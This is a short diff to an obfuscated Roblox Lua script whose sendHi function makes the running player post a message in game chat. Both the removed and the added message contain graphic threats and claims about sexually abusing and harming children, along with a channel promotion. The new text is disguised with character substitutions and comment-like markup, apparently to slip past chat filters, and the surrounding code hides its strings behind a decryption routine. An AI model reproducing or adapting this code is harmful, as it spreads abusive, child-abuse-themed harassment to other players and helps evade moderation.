@@ -168,7 +168,7 @@ local TextChatService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\122\18\41\
 local LocalPlayer = Players.LocalPlayer;
 local chat = TextChatService.ChatInputBarConfiguration.TargetTextChannel;
 local function sendHi()
-	local message = "made by mzlf with love, join to my 🆃🅴🅻🅴🅶🆁🅰️🅼 - russianmzlfchannel, 🅸 🆁🅰️🅿️🅴 🅲🅷🅸🅻🅳🆁🅴🅽🆂, 🅸 🅺🅸🅻🅻 🅲🅷🅸🅻🅳🆁🅴🅽🆂, 🅸 🅳🅸🆂🅼🅴🅼🅱️🅴🆁 🅲🅷🅸🅻🅳🆁🅴🅽🆂,я̶ ̷е̶б̶у̷ ̶д̶е̷т̴е̸й̴ ";
+	local message = "k<!_i_will_rfpe_your_kids._i_abuse_kids89._made_by_mzlf-->hi";
 	if (TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService) then
 		ReplicatedStorage:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\15\137\54\173\188\177\34\8\132\49\184\154\164\37\63\137\61\143\161\188\34\14\154\53\162\189\174", "\86\75\236\80\204\201\221")).SayMessageRequest:FireServer(message, LUAOBFUSACTOR_DECRYPT_STR_0("\83\77\123", "\235\18\33\23\229\158"));
 	else
